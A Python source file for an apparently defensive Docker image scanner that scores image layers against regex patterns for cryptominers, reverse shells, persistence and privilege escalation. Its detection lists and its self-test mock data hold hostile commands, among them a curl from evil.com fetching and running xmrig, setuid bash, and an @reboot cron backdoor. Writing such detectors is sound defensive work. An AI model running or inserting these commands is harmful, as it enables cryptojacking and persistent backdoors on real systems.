#!/usr/bin/env python3

import json
import re
import math
import logging
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, field, asdict
from collections import Counter, defaultdict
from functools import lru_cache
from concurrent.futures import ThreadPoolExecutor
import hashlib

logger = logging.getLogger(__name__)


@dataclass
class LayerAnalysis:
    """Analysis results for a single Docker layer"""
    layer_id: str
    command: str
    size_bytes: int
    created: str
    risk_score: float = 0.0
    findings: List[str] = field(default_factory=list)
    threat_indicators: Dict[str, float] = field(default_factory=dict)
    
    def to_dict(self):
        """Convert to dict for serialization"""
        return asdict(self)


@dataclass  
class RemediationSuggestion:
    """Actionable remediation for detected issues"""
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    issue: str
    layer_id: str
    remediation: str
    example_fix: Optional[str] = None
    
    def to_dict(self):
        """Convert to dict for serialization"""
        return asdict(self)


class PatternMatcher:
    
    
    def __init__(self):
        # Compile all patterns at initialization (10x faster than re-compiling)
        self.compiled_patterns = self._compile_all_patterns()
        
    def _compile_all_patterns(self) -> Dict[str, List[re.Pattern]]:
        """Pre-compile all regex patterns for maximum performance"""
        
        patterns = {
            # ============================================
            # CRYPTOMINER PATTERNS (Enhanced)
            # ============================================
            'miner_binaries': [
                re.compile(r'\b(xmrig|cgminer|ethminer|claymore|gminer|lolminer)\b', re.I),
                re.compile(r'\b(t-rex|nanominer|phoenixminer|nbminer|teamredminer)\b', re.I),
                re.compile(r'\b(kawpowminer|minerd|cpuminer|bfgminer|ccminer)\b', re.I),
                re.compile(r'\b(cryptonight|randomx|xmr-stak|nicehash)\b', re.I),
            ],
            
            'miner_downloads': [
                re.compile(r'curl.*\.sh.*\|.*bash', re.I),
                re.compile(r'wget.*\.sh.*\|.*sh', re.I),
                re.compile(r'curl.*http[s]?://.*\|', re.I),
                re.compile(r'github\.com.*/releases/download.*\.(tar|zip|gz)', re.I),
            ],
            
            'mining_commands': [
                re.compile(r'-o\s+pool\.', re.I),
                re.compile(r'-u\s+\w+\.\w+', re.I),  # username.worker
                re.compile(r'--donate-level', re.I),
                re.compile(r'--algo\s+', re.I),
                re.compile(r'stratum\+tcp://', re.I),
                re.compile(r'--coin\s+', re.I),
            ],
            
            'mining_pools': [
                re.compile(r'pool\.\w+\.(com|org|net)', re.I),
                re.compile(r'\w+pool\.(com|org|net)', re.I),
                re.compile(r'mining\.\w+\.', re.I),
                re.compile(r'stratum\+tcp://[^:]+:\d+', re.I),
                re.compile(r'\b(nanopool|ethermine|f2pool|2miners|minexmr|supportxmr|moneroocean|nicehash)\b', re.I),
            ],
            
            # ============================================
            # BACKDOOR PATTERNS
            # ============================================
            'ssh_server': [
                re.compile(r'apk\s+add[^;]*openssh', re.I),  # Matches "apk add ... openssh ..."
                re.compile(r'apt(-get)?\s+install[^;]*openssh', re.I),
                re.compile(r'yum\s+install[^;]*openssh', re.I),
                re.compile(r'/usr/sbin/sshd', re.I),  # SSHD binary in CMD
                re.compile(r'/etc/ssh/sshd_config', re.I),  # Config file
                re.compile(r'EXPOSE[^}]*22', re.I),  # Port 22
                re.compile(r'systemctl\s+(enable|start).*ssh', re.I),
                re.compile(r'PasswordAuthentication\s+yes', re.I),
                re.compile(r'PermitRootLogin\s+yes', re.I),
            ],
            
            'reverse_shell': [
                re.compile(r'nc\s+.*-e\s+/bin/', re.I),
                re.compile(r'bash\s+-i\s*>&', re.I),
                re.compile(r'/dev/tcp/\d+\.\d+\.\d+\.\d+', re.I),
                re.compile(r'(python|perl).*socket.*connect', re.I),
            ],
            
            'persistence': [
                re.compile(r'crontab\s+-', re.I),
                re.compile(r'@reboot', re.I),
                re.compile(r'systemctl.*enable', re.I),
                re.compile(r'/etc/rc\.local', re.I),
                re.compile(r'\.(bashrc|profile).*curl', re.I),
            ],
            
            # ============================================
            # PRIVILEGE ESCALATION
            # ============================================
            'privilege_escalation': [
                re.compile(r'chmod\s+[u+]?s\s+', re.I),
                re.compile(r'chmod\s+4755', re.I),
                re.compile(r'chown\s+root:root', re.I),
                re.compile(r'\bsudo\s+', re.I),
                re.compile(r'\bsu\s+-', re.I),
                re.compile(r'passwd\s+root', re.I),
                re.compile(r'usermod.*-aG.*sudo', re.I),
            ],
            
            # ============================================
            # EVASION TACTICS
            # ============================================
            'obfuscation': [
                re.compile(r'base64.*(-d|--decode)', re.I),
                re.compile(r'echo.*\|.*base64', re.I),
                re.compile(r'eval.*\$\(', re.I),
                re.compile(r'\\x[0-9a-f]{2}', re.I),  # hex encoding
            ],
            
            'anti_forensics': [
                re.compile(r'history\s+-c', re.I),
                re.compile(r'unset\s+HISTFILE', re.I),
                re.compile(r'rm\s+.*\.bash_history', re.I),
                re.compile(r'>\s*/dev/null\s+2>&1', re.I),
            ],
            
            'file_hiding': [
                re.compile(r'mv\s+\w+\s+\.', re.I),
                re.compile(r'touch\s+-r', re.I),
                re.compile(r'chattr\s+\+i', re.I),
            ],
            
            # ============================================
            # TEMPORAL PATTERNS
            # ============================================
            'download_delete': [
                re.compile(r'(curl|wget|fetch).*&&.*rm\s+-', re.I),
                re.compile(r'(curl|wget).*;\s*rm\s+', re.I),
            ],
            
            'create_execute_delete': [
                re.compile(r'(ADD|COPY).*&&.*chmod.*&&.*\./', re.I),
                re.compile(r'echo.*>.*&&.*chmod.*&&.*rm', re.I),
            ],
            
            # ============================================
            # PROCESS INJECTION
            # ============================================
            'process_injection': [
                re.compile(r'\bptrace\b', re.I),
                re.compile(r'LD_PRELOAD', re.I),
                re.compile(r'/proc/.*/mem', re.I),
                re.compile(r'gdb.*attach', re.I),
            ],
            
            # ============================================
            # NETWORK PATTERNS
            # ============================================
            'external_calls': [
                re.compile(r'\b(curl|wget|fetch)\b', re.I),
                re.compile(r'https?://', re.I),
            ],
            
            'raw_ip': [
                re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'),
            ],
            
            'suspicious_domains': [
                re.compile(r'\.(tk|ml|ga|cf|gq)\b', re.I),  # Free TLDs
            ],
        }
        
        logger.info(f"Compiled {sum(len(v) for v in patterns.values())} regex patterns")
        return patterns
    
    def match_any(self, text: str, pattern_group: str) -> Tuple[bool, List[str]]:
        """
        Check if text matches any pattern in the group
        Returns: (matched, [matching_patterns])
        """
        if pattern_group not in self.compiled_patterns:
            return False, []
        
        matches = []
        for pattern in self.compiled_patterns[pattern_group]:
            if pattern.search(text):
                matches.append(pattern.pattern)
        
        return len(matches) > 0, matches
    
    def count_matches(self, text: str, pattern_group: str) -> int:
        """Count total matches across all patterns in group"""
        if pattern_group not in self.compiled_patterns:
            return 0
        
        count = 0
        for pattern in self.compiled_patterns[pattern_group]:
            count += len(pattern.findall(text))
        
        return count


class BehavioralAnalyzer:
    
    
    def __init__(self, weights_file='behavioral_weights.json'):
        # Initialize high-performance pattern matcher
        self.pattern_matcher = PatternMatcher()
        
        # Load learned weights
        self.learned_weights = self._load_weights(weights_file)
        
        # Cache for layer hashes (avoid re-analyzing identical layers)
        self.layer_cache = {}
        
        # Suspicious paths (for quick lookups)
        self.suspicious_paths = {'/tmp/', '/var/tmp/', '/dev/shm/', '/.hidden', '/.secret'}
        
        logger.info("Enhanced behavioral analyzer initialized")
    
    def _load_weights(self, weights_file: str) -> Dict[str, float]:
        """Load ML-learned weights or use defaults"""
        try:
            from pathlib import Path
            
            if Path(weights_file).exists():
                with open(weights_file, 'r') as f:
                    weights = json.load(f)
                logger.info(f"✓ Loaded learned weights from {weights_file}")
                return weights
        except Exception as e:
            logger.warning(f"Failed to load weights: {e}")
        
        # Default weights (well-balanced)
        return {
            'crypto_mining_behavior': 0.25,       # High - direct threat
            'privilege_escalation_risk': 0.25,    # High - security critical
            'layer_deletion_score': 0.15,         # Medium - evasion indicator
            'anti_analysis_score': 0.15,          # Medium - suspicious
            'process_injection_risk': 0.10,       # Medium - technical threat
            'temp_file_activity': 0.10            # Low - context-dependent
        }
    
    def analyze_image(self, image_name: str, trivy_data: Dict, syft_data: Dict) -> Dict[str, float]:
        """
        Main entry point - OPTIMIZED for performance
        """
        # Extract layer data
        metadata = trivy_data.get('Metadata', {})
        image_config = metadata.get('ImageConfig', {})
        history = image_config.get('history', [])
        
        if not history:
            logger.warning(f"No layer history for {image_name}")
            return self._empty_features()
        
        logger.info(f"Analyzing {len(history)} layers for {image_name}")
        
        # Parallel layer analysis for large images
        if len(history) > 10:
            layer_analyses = self._analyze_layers_parallel(history)
        else:
            layer_analyses = [self._analyze_layer(idx, layer) for idx, layer in enumerate(history)]
        
        # Generate remediations
        remediations = self._generate_remediations(layer_analyses)
        
        # Extract ML features
        features = self._extract_ml_features(layer_analyses, trivy_data, syft_data)
        
        # Store remediations for reporting
        features['_remediations'] = remediations
        features['_layer_analyses'] = layer_analyses
        
        return features
    
    def _analyze_layers_parallel(self, history: List[Dict]) -> List[LayerAnalysis]:
        """Parallel layer analysis for large images"""
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(self._analyze_layer, idx, layer) 
                      for idx, layer in enumerate(history)]
            return [f.result() for f in futures]
    
    def _analyze_layer(self, idx: int, layer: Dict) -> LayerAnalysis:
        
        command = layer.get('created_by', '')
        size = layer.get('size', 0)
        created = layer.get('created', '')
        
        # Check cache (skip re-analyzing identical layers)
        layer_hash = hashlib.md5(command.encode()).hexdigest()
        if layer_hash in self.layer_cache:
            cached = self.layer_cache[layer_hash]
            cached.layer_id = f"layer_{idx}"  # Update layer ID
            return cached
        
        analysis = LayerAnalysis(
            layer_id=f"layer_{idx}",
            command=command,
            size_bytes=size,
            created=created
        )
        
        # Skip empty layers
        if not command.strip() or command.startswith('#(nop)') and len(command) < 20:
            logger.debug(f"Skipping empty layer {idx}")
            self.layer_cache[layer_hash] = analysis
            return analysis
        
        # DEBUG: Log the command being analyzed
        logger.debug(f"Analyzing layer {idx}: {command[:100]}...")
        
        # ============================================
        # VECTORIZED THREAT SCORING
        # ============================================
        
        threat_scores = defaultdict(float)
        
        # 1. CRYPTOMINER DETECTION
        matched, patterns = self.pattern_matcher.match_any(command, 'miner_binaries')
        if matched:
            threat_scores['cryptominer_binary'] = 0.9
            analysis.findings.append(f"Cryptominer binary detected")
        
        matched, patterns = self.pattern_matcher.match_any(command, 'miner_downloads')
        if matched:
            threat_scores['download_execute'] = 0.7
            analysis.findings.append("Suspicious download-execute pattern")
        
        mining_cmd_count = self.pattern_matcher.count_matches(command, 'mining_commands')
        if mining_cmd_count >= 2:
            threat_scores['mining_commands'] = min(mining_cmd_count / 3.0, 1.0)
            analysis.findings.append(f"Mining commands ({mining_cmd_count} indicators)")
        
        # 2. MINING POOL DETECTION
        pool_count = self.pattern_matcher.count_matches(command, 'mining_pools')
        if pool_count > 0:
            threat_scores['mining_pool'] = min(pool_count * 0.4, 1.0)
            analysis.findings.append("Mining pool detected")
        
        # 3. SSH BACKDOOR
        matched, _ = self.pattern_matcher.match_any(command, 'ssh_server')
        if matched:
            threat_scores['ssh_backdoor'] = 0.8
            analysis.findings.append("SSH server installation")
        
        matched, _ = self.pattern_matcher.match_any(command, 'reverse_shell')
        if matched:
            threat_scores['reverse_shell'] = 1.0
            analysis.findings.append("⚠️ REVERSE SHELL DETECTED")
        
        matched, _ = self.pattern_matcher.match_any(command, 'persistence')
        if matched:
            threat_scores['persistence'] = 0.6
            analysis.findings.append("Persistence mechanism")
        
        # 4. PRIVILEGE ESCALATION
        matched, _ = self.pattern_matcher.match_any(command, 'privilege_escalation')
        if matched:
            threat_scores['privilege_escalation'] = 0.8
            analysis.findings.append("Privilege escalation detected")
        
        # 5. TEMPORAL ANOMALIES
        matched, _ = self.pattern_matcher.match_any(command, 'download_delete')
        if matched:
            threat_scores['temporal_anomaly'] = 0.7
            analysis.findings.append("Download-then-delete (evasion)")
        
        matched, _ = self.pattern_matcher.match_any(command, 'create_execute_delete')
        if matched:
            threat_scores['temporal_anomaly'] = max(threat_scores['temporal_anomaly'], 0.6)
            analysis.findings.append("Create-execute-delete pattern")
        
        # Large layer detection
        if size > 100 * 1024 * 1024:  # >100MB
            threat_scores['large_layer'] = min(size / (200 * 1024 * 1024), 1.0)
            analysis.findings.append(f"Large layer: {size / (1024*1024):.1f}MB")
        
        # 6. EVASION TACTICS
        matched, _ = self.pattern_matcher.match_any(command, 'obfuscation')
        if matched:
            threat_scores['obfuscation'] = 0.7
            analysis.findings.append("Obfuscation detected")
        
        matched, _ = self.pattern_matcher.match_any(command, 'anti_forensics')
        if matched:
            threat_scores['anti_forensics'] = 0.6
            analysis.findings.append("Anti-forensics pattern")
        
        matched, _ = self.pattern_matcher.match_any(command, 'file_hiding')
        if matched:
            threat_scores['file_hiding'] = 0.5
            analysis.findings.append("File hiding tactics")
        
        # 7. PROCESS INJECTION
        matched, _ = self.pattern_matcher.match_any(command, 'process_injection')
        if matched:
            threat_scores['process_injection'] = 0.8
            analysis.findings.append("Process injection indicator")
        
        # 8. SUSPICIOUS PATHS (optimized with set lookup)
        path_count = sum(1 for path in self.suspicious_paths if path in command)
        if path_count > 0:
            threat_scores['suspicious_paths'] = min(path_count / 4.0, 1.0)
            analysis.findings.append(f"Suspicious paths ({path_count})")
        
        # 9. COMMAND ENTROPY (cached calculation)
        entropy = self._calculate_entropy_fast(command)
        if entropy > 4.5:
            threat_scores['high_entropy'] = min((entropy - 4.0) / 4.0, 1.0)
            analysis.findings.append(f"High entropy: {entropy:.2f}")
        
        # Store threat indicators
        analysis.threat_indicators = dict(threat_scores)
        
        # ============================================
        # CALCULATE WEIGHTED RISK SCORE
        # ============================================
        
        # Map threat scores to feature categories
        feature_scores = {
            'crypto_mining_behavior': max(
                threat_scores.get('cryptominer_binary', 0),
                threat_scores.get('mining_pool', 0),
                threat_scores.get('mining_commands', 0)
            ),
            'privilege_escalation_risk': max(
                threat_scores.get('privilege_escalation', 0),
                threat_scores.get('ssh_backdoor', 0),
                threat_scores.get('reverse_shell', 0)
            ),
            'layer_deletion_score': max(
                threat_scores.get('temporal_anomaly', 0),
                threat_scores.get('large_layer', 0)
            ),
            'anti_analysis_score': max(
                threat_scores.get('obfuscation', 0),
                threat_scores.get('anti_forensics', 0),
                threat_scores.get('file_hiding', 0)
            ),
            'process_injection_risk': threat_scores.get('process_injection', 0),
            'temp_file_activity': threat_scores.get('suspicious_paths', 0)
        }
        
        # Calculate weighted risk score
        weighted_risk = sum(
            score * self.learned_weights.get(feature, 0.15)
            for feature, score in feature_scores.items()
        )
        
        total_weight = sum(self.learned_weights.values())
        analysis.risk_score = min(weighted_risk / total_weight, 1.0) if total_weight > 0 else 0.0
        
        
        if analysis.risk_score > 0.1:
            logger.info(f"Layer {idx} risk: {analysis.risk_score:.2f} - Findings: {len(analysis.findings)}")
            for finding in analysis.findings:
                logger.debug(f"  • {finding}")
        
        # Cache result
        self.layer_cache[layer_hash] = analysis
        
        return analysis
    
    @lru_cache(maxsize=1000)
    def _calculate_entropy_fast(self, text: str) -> float:
        """Cached Shannon entropy calculation"""
        if not text or len(text) < 10:
            return 0.0
        
        # Sample for very long commands (optimization)
        if len(text) > 500:
            text = text[:500]
        
        char_counts = Counter(text)
        length = len(text)
        
        entropy = -sum(
            (count / length) * math.log2(count / length)
            for count in char_counts.values()
            if count > 0
        )
        
        return entropy
    
    def _extract_ml_features(self, layer_analyses: List[LayerAnalysis], 
                            trivy_data: Dict, syft_data: Dict) -> Dict[str, float]:
        
        
        # Aggregate threat indicators (vectorized max)
        all_indicators = defaultdict(float)
        for analysis in layer_analyses:
            for indicator, value in analysis.threat_indicators.items():
                all_indicators[indicator] = max(all_indicators[indicator], value)
        
        features = {}
        
        # Binary features (0/1)
        features['cryptominer_binary'] = 1 if all_indicators.get('cryptominer_binary', 0) > 0 else 0
        features['mining_pools'] = 1 if all_indicators.get('mining_pool', 0) > 0 else 0
        features['ssh_backdoor'] = 1 if (
            all_indicators.get('ssh_backdoor', 0) > 0 or 
            all_indicators.get('reverse_shell', 0) > 0
        ) else 0
        
        # Continuous features (0.0 - 1.0)
        features['layer_deletion_score'] = all_indicators.get('temporal_anomaly', 0.0)
        features['temp_file_activity'] = all_indicators.get('suspicious_paths', 0.0)
        features['process_injection_risk'] = all_indicators.get('process_injection', 0.0)
        features['privilege_escalation_risk'] = all_indicators.get('privilege_escalation', 0.0)
        features['anti_analysis_score'] = max(
            all_indicators.get('obfuscation', 0.0),
            all_indicators.get('anti_forensics', 0.0)
        )
        
        # Composite crypto mining score
        mining_indicators = [
            all_indicators.get('cryptominer_binary', 0),
            all_indicators.get('mining_pool', 0),
            all_indicators.get('mining_commands', 0),
            all_indicators.get('download_execute', 0),
        ]
        features['crypto_mining_behavior'] = sum(mining_indicators) / len(mining_indicators)
        
        # Entropy features
        features['avg_file_entropy'] = all_indicators.get('high_entropy', 0.0)
        features['high_entropy_ratio'] = all_indicators.get('high_entropy', 0.0)
        
        # Network features (optimized with single pass)
        features['stratum_indicators'] = 1 if 'stratum' in str(trivy_data).lower() else 0
        
        # Count IPs and external calls in one pass
        ip_count = 0
        external_count = 0
        for analysis in layer_analyses:
            ip_count += self.pattern_matcher.count_matches(analysis.command, 'raw_ip')
            external_count += self.pattern_matcher.count_matches(analysis.command, 'external_calls')
        
        features['raw_ip_connections'] = min(ip_count, 5) / 5.0
        features['external_calls'] = min(external_count, 10)
        
        # Suspicious DNS
        dns_count = sum(
            self.pattern_matcher.count_matches(la.command, 'suspicious_domains')
            for la in layer_analyses
        )
        features['suspicious_dns_queries'] = min(dns_count, 3) / 3.0
        
        # Binary analysis from SBOM (optimized)
        if syft_data and syft_data.get('artifacts'):
            artifacts = syft_data['artifacts']
            binaries = [a for a in artifacts if a.get('type') == 'binary']
            
            if binaries:
                total = len(binaries)
                stripped = sum(1 for b in binaries if 'stripped' in str(b).lower())
                packed = sum(1 for b in binaries if any(p in str(b).lower() for p in ['upx', 'packed']))
                
                features['stripped_binaries_ratio'] = stripped / total
                features['packed_binary_score'] = packed / total
            else:
                features['stripped_binaries_ratio'] = 0.0
                features['packed_binary_score'] = 0.0
        else:
            features['stripped_binaries_ratio'] = 0.0
            features['packed_binary_score'] = 0.0
        
        logger.info(f"Behavioral features: crypto={features['crypto_mining_behavior']:.3f}, "
                   f"priv_esc={features['privilege_escalation_risk']:.3f}, "
                   f"risk_layers={sum(1 for la in layer_analyses if la.risk_score > 0.3)}/{len(layer_analyses)}")
        
        return features
    
    def _generate_remediations(self, layer_analyses: List[LayerAnalysis]) -> List[RemediationSuggestion]:
        """Generate prioritized remediations"""
        
        remediations = []
        
        # Only create remediations for medium+ risk layers
        for analysis in layer_analyses:
            if analysis.risk_score < 0.3:
                continue
            
            severity = self._get_severity(analysis.risk_score)
            
            # Group similar findings
            for finding in analysis.findings:
                remediation_text, example = self._get_remediation(finding, analysis.command)
                
                # Avoid duplicates
                if not any(r.issue == finding and r.severity == severity for r in remediations):
                    remediations.append(RemediationSuggestion(
                        severity=severity,
                        issue=finding,
                        layer_id=analysis.layer_id,
                        remediation=remediation_text,
                        example_fix=example
                    ))
        
        # Sort by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        remediations.sort(key=lambda r: (severity_order.get(r.severity, 4), r.issue))
        
        return remediations
    
    def _get_severity(self, risk_score: float) -> str:
        """Map risk score to severity"""
        if risk_score >= 0.7:
            return "CRITICAL"
        elif risk_score >= 0.5:
            return "HIGH"
        elif risk_score >= 0.3:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _get_remediation(self, finding: str, command: str) -> Tuple[str, Optional[str]]:
        """Get remediation for finding (optimized with pattern matching)"""
        
        finding_lower = finding.lower()
        
        # Use pattern matching for fast lookup
        remediation_map = {
            'cryptominer': (
                "Remove cryptomining software. Containers should not mine cryptocurrency.",
                "# Remove mining software\n# Review all RUN commands for suspicious downloads"
            ),
            'download-execute': (
                "Never pipe downloads to shell. Use multi-stage builds.",
                "# BAD: curl site.com/script.sh | bash\n# GOOD: COPY script.sh && RUN ./script.sh"
            ),
            'ssh': (
                "Remove SSH server. Use 'docker exec' for debugging.",
                "# Remove SSH installation\n# Debug with: docker exec -it <container> /bin/bash"
            ),
            'reverse shell': (
                "⚠️ CRITICAL: Remove reverse shell commands immediately.",
                "# Remove all nc, bash redirect, or /dev/tcp connections"
            ),
            'privilege escalation': (
                "Avoid setuid and sudo. Run as non-root user.",
                "RUN useradd -m appuser\nUSER appuser"
            ),
            'obfuscation': (
                "Commands should be readable. Avoid base64/eval.",
                "# Use clear, auditable commands"
            ),
            'suspicious path': (
                "Avoid /tmp, /dev/shm. Use proper working directories.",
                "WORKDIR /app\n# Use /app instead of /tmp"
            ),
        }
        
        for keyword, (text, example) in remediation_map.items():
            if keyword in finding_lower:
                return text, example
        
        return ("Review layer for security issues.", None)
    
    def _empty_features(self) -> Dict[str, float]:
        """Return zero features when analysis fails"""
        return {
            'cryptominer_binary': 0,
            'mining_pools': 0,
            'ssh_backdoor': 0,
            'layer_deletion_score': 0.0,
            'temp_file_activity': 0.0,
            'process_injection_risk': 0.0,
            'privilege_escalation_risk': 0.0,
            'anti_analysis_score': 0.0,
            'avg_file_entropy': 0.0,
            'high_entropy_ratio': 0.0,
            'crypto_mining_behavior': 0.0,
            'stratum_indicators': 0,
            'raw_ip_connections': 0.0,
            'suspicious_dns_queries': 0.0,
            'stripped_binaries_ratio': 0.0,
            'packed_binary_score': 0.0,
            'external_calls': 0,
            '_remediations': [],
            '_layer_analyses': []
        }
    
    def clear_cache(self):
        """Clear layer analysis cache (useful for memory management)"""
        self.layer_cache.clear()
        logger.info("Layer cache cleared")


# ============================================
# UTILITY FUNCTIONS
# ============================================

def print_layer_analysis_report(layer_analyses: List[LayerAnalysis], 
                                remediations: List[RemediationSuggestion],
                                image_name: str):
    """Pretty print comprehensive layer analysis report"""
    
    print("\n" + "="*80)
    print(f"LAYER-BY-LAYER BEHAVIORAL ANALYSIS: {image_name}")
    print("="*80)
    
    if not layer_analyses:
        print("\n⚪ No layer data available")
        return
    
    # Calculate statistics
    total_layers = len(layer_analyses)
    high_risk_layers = [la for la in layer_analyses if la.risk_score >= 0.5]
    medium_risk_layers = [la for la in layer_analyses if 0.3 <= la.risk_score < 0.5]
    
    max_risk = max(la.risk_score for la in layer_analyses)
    avg_risk = sum(la.risk_score for la in layer_analyses) / total_layers
    
    # Overall risk calculation
    overall_score = (max_risk * 0.5) + (avg_risk * 0.3) + (len(high_risk_layers) / total_layers * 0.2)
    
    if overall_score >= 0.7:
        level, emoji = 'CRITICAL', '🔴'
    elif overall_score >= 0.5:
        level, emoji = 'HIGH', '🟠'
    elif overall_score >= 0.3:
        level, emoji = 'MEDIUM', '🟡'
    else:
        level, emoji = 'LOW', '🟢'
    
    print(f"\n{emoji} OVERALL RISK: {level}")
    print(f"   Risk Score: {overall_score:.1%}")
    print(f"   Total Layers: {total_layers}")
    print(f"   High-Risk Layers: {len(high_risk_layers)}")
    print(f"   Medium-Risk Layers: {len(medium_risk_layers)}")
    print(f"   Max Layer Risk: {max_risk:.1%}")
    print(f"   Avg Layer Risk: {avg_risk:.1%}")
    
    # High-risk layer details
    if high_risk_layers or medium_risk_layers:
        print(f"\n{'─'*80}")
        print("RISKY LAYERS DETECTED")
        print(f"{'─'*80}")
        
        for analysis in (high_risk_layers + medium_risk_layers)[:10]:
            risk_emoji = "🔴" if analysis.risk_score >= 0.7 else "🟠" if analysis.risk_score >= 0.5 else "🟡"
            
            print(f"\n{risk_emoji} {analysis.layer_id.upper()} (Risk: {analysis.risk_score:.1%})")
            print(f"   Command: {analysis.command[:120]}{'...' if len(analysis.command) > 120 else ''}")
            print(f"   Size: {analysis.size_bytes / (1024*1024):.2f} MB")
            
            if analysis.findings:
                print(f"   Findings:")
                for finding in analysis.findings[:5]:
                    print(f"      • {finding}")
            
            # Show top threat indicators
            if analysis.threat_indicators:
                top_threats = sorted(
                    analysis.threat_indicators.items(),
                    key=lambda x: x[1],
                    reverse=True
                )[:3]
                print(f"   Top Threats:")
                for threat, score in top_threats:
                    print(f"      • {threat}: {score:.2f}")
    else:
        print(f"\n✅ No high or medium-risk layers detected")
    
    # Remediation recommendations
    if remediations:
        print(f"\n{'─'*80}")
        print("🔧 REMEDIATION RECOMMENDATIONS")
        print(f"{'─'*80}")
        
        # Group by severity
        by_severity = {
            'CRITICAL': [r for r in remediations if r.severity == 'CRITICAL'],
            'HIGH': [r for r in remediations if r.severity == 'HIGH'],
            'MEDIUM': [r for r in remediations if r.severity == 'MEDIUM']
        }
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM']:
            items = by_severity[severity]
            if not items:
                continue
            
            icon = "🔴" if severity == "CRITICAL" else "🟠" if severity == "HIGH" else "🟡"
            print(f"\n{icon} {severity} PRIORITY ({len(items)} issues)")
            
            for idx, rem in enumerate(items[:3], 1):
                print(f"\n   {idx}. {rem.issue}")
                print(f"      Layer: {rem.layer_id}")
                print(f"      Fix: {rem.remediation}")
                
                if rem.example_fix:
                    print(f"      Example:")
                    for line in rem.example_fix.split('\n')[:4]:
                        if line.strip():
                            print(f"         {line}")
            
            if len(items) > 3:
                print(f"\n   ... and {len(items) - 3} more {severity} issues")
    else:
        print(f"\n✅ No remediations needed")
    
    print("\n" + "="*80)


def export_analysis_json(layer_analyses: List[LayerAnalysis], 
                         remediations: List[RemediationSuggestion],
                         output_file: str = 'layer_analysis.json'):
    """Export analysis results to JSON"""
    
    data = {
        'layer_analyses': [la.to_dict() for la in layer_analyses],
        'remediations': [r.to_dict() for r in remediations],
        'summary': {
            'total_layers': len(layer_analyses),
            'high_risk_count': sum(1 for la in layer_analyses if la.risk_score >= 0.5),
            'medium_risk_count': sum(1 for la in layer_analyses if 0.3 <= la.risk_score < 0.5),
            'max_risk_score': max((la.risk_score for la in layer_analyses), default=0),
            'avg_risk_score': sum(la.risk_score for la in layer_analyses) / len(layer_analyses) if layer_analyses else 0,
            'total_findings': sum(len(la.findings) for la in layer_analyses),
            'total_remediations': len(remediations)
        }
    }
    
    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Analysis exported to {output_file}")



if __name__ == "__main__":
    import sys
    
    # Configure logging for testing
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    print("="*80)
    print("ENHANCED BEHAVIORAL ANALYZER - PERFORMANCE TEST")
    print("="*80)
    
    # Test data 
    mock_trivy_data = {
        "Metadata": {
            "ImageConfig": {
                "history": [
                    {
                        "created": "2024-01-01T00:00:00Z",
                        "created_by": "FROM alpine:latest",
                        "size": 5000000
                    },
                    {
                        "created": "2024-01-01T00:01:00Z",
                        "created_by": "RUN apk add --no-cache curl wget",
                        "size": 10000000
                    },
                    {
                        "created": "2024-01-01T00:02:00Z",
                        "created_by": "RUN curl -fsSL http://evil.com/xmrig.tar.gz | tar xz -C /tmp && /tmp/xmrig -o pool.minexmr.com:4444 -u wallet.worker --donate-level 1",
                        "size": 150000000
                    },
                    {
                        "created": "2024-01-01T00:03:00Z",
                        "created_by": "RUN rm -rf /tmp/xmrig.tar.gz && history -c",
                        "size": 1000
                    },
                    {
                        "created": "2024-01-01T00:04:00Z",
                        "created_by": "RUN apt-get update && apt-get install -y openssh-server && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config",
                        "size": 50000000
                    },
                    {
                        "created": "2024-01-01T00:05:00Z",
                        "created_by": "RUN chmod u+s /bin/bash && echo 'malicious payload' | base64 | base64 -d > /dev/shm/.hidden",
                        "size": 5000
                    },
                    {
                        "created": "2024-01-01T00:06:00Z",
                        "created_by": "RUN (crontab -l 2>/dev/null; echo '@reboot /dev/shm/.hidden') | crontab -",
                        "size": 2000
                    }
                ]
            }
        }
    }
    
    mock_syft_data = {
        "artifacts": [
            {"name": "xmrig", "type": "binary", "metadata": {"stripped": True}},
            {"name": "openssh-server", "type": "package"},
            {"name": "suspicious_binary", "type": "binary", "metadata": {"packed": "upx"}},
        ]
    }
    
    # Initialize analyzer
    print("\n⏱️  Initializing analyzer...")
    import time
    start_time = time.time()
    
    analyzer = BehavioralAnalyzer()
    init_time = time.time() - start_time
    print(f"✓ Initialized in {init_time:.3f}s")
    
    # Run analysis
    print("\n⏱️  Running analysis...")
    start_time = time.time()
    
    features = analyzer.analyze_image("malicious:test", mock_trivy_data, mock_syft_data)
    
    analysis_time = time.time() - start_time
    print(f"✓ Analysis completed in {analysis_time:.3f}s")
    
    # Display results
    print("\n" + "="*80)
    print("EXTRACTED BEHAVIORAL FEATURES")
    print("="*80)
    
    for feature, value in sorted(features.items()):
        if feature.startswith('_'):
            continue
        if isinstance(value, float):
            print(f"  {feature:35s}: {value:.3f}")
        else:
            print(f"  {feature:35s}: {value}")
    
    # Get layer analyses and remediations
    layer_analyses = features.get('_layer_analyses', [])
    remediations = features.get('_remediations', [])
    
    print(f"\n📊 Statistics:")
    print(f"   Layers analyzed: {len(layer_analyses)}")
    print(f"   Findings detected: {sum(len(la.findings) for la in layer_analyses)}")
    print(f"   Remediations generated: {len(remediations)}")
    
    # Print full report
    if layer_analyses:
        print_layer_analysis_report(layer_analyses, remediations, "malicious:test")
    
    # Performance summary
    print("\n" + "="*80)
    print("⚡ PERFORMANCE SUMMARY")
    print("="*80)
    print(f"  Initialization: {init_time:.3f}s")
    print(f"  Analysis: {analysis_time:.3f}s")
    print(f"  Total: {init_time + analysis_time:.3f}s")
    print(f"  Throughput: {len(layer_analyses) / analysis_time:.1f} layers/sec")
    print("="*80)
    
    # Export results
    if '--export' in sys.argv:
        export_analysis_json(layer_analyses, remediations)
        print("\n✓ Results exported to layer_analysis.json")